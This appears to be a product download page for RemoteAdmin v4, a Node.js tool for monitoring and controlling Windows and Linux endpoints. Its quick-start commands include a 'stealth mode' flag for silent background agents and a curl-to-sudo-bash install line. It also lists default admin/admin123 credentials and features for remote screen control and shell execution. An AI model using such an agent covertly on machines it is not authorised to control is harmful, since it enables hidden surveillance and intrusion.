🌐 RemoteAdmin v4

A comprehensive remote administration system for managing Windows and Linux endpoints. Monitor, control, and deploy software across your fleet.

v4.0.0 Production Ready Cross-Platform

📥 Download RemoteAdmin v4

Complete portable package. Includes server, agent, and all required files.

Download ZIP Archive
📄 4 files 💾 124.41 KB 🕒 Built 2026-04-01 08:26:47 UTC

💾 Standalone Executables

Pre-built agent installers. Run directly on target machines — no Node.js required.

🖥️ remoteadmin-agent-win.exe (35.98 MB)🐧 remoteadmin-agent-linux (44.21 MB)

⚡ Quick Start

Server
Agent (Windows)
Agent (Linux)
# Extract and install dependencies unzip RemoteAdmin-v4.zip cd RemoteAdmin-v4 npm install # Start the server npm start # Or with custom settings PORT=8080 JWT_SECRET=your-secret npm start

Open http://localhost:3000 — Login: admin / admin123

# Copy agent.js and package.json to target machine # Install dependencies npm install --production # Connect to server node agent.js --server ws://yourserver.com:3000/ws/agent # Run in stealth mode node agent.js --server ws://yourserver.com:3000/ws/agent --stealth

Agent auto-starts on boot. Local store: http://127.0.0.1:8475/store

# Install Node.js if not present curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - sudo apt-get install -y nodejs # Setup and start agent npm install --production node agent.js --server ws://yourserver.com:3000/ws/agent

Agent creates systemd service for auto-start. Requires: xdotool, imagemagick

📊

Real-time Monitoring

CPU, memory, disk usage tracking with live WebSocket updates and historical data.

🖥️

Remote Control

View screens, control mouse & keyboard, stream desktop in real-time.

🛒

App Store

Built-in app store for deploying software across your fleet with one click.

📋

Support Tickets

End-users can submit support tickets directly from the agent interface.

🔐

2FA Security

TOTP-based two-factor authentication with QR code setup for admin accounts.

🔄

Auto Updates

Push agent updates remotely. Agents self-update and restart automatically.

🎯

Command Execution

Execute shell commands remotely on any connected agent with full output.

👁️

Stealth Mode

Run agent silently with no console output, perfect for background deployment.

RemoteAdmin v4 — Built with Node.js, WebSocket, SQLite
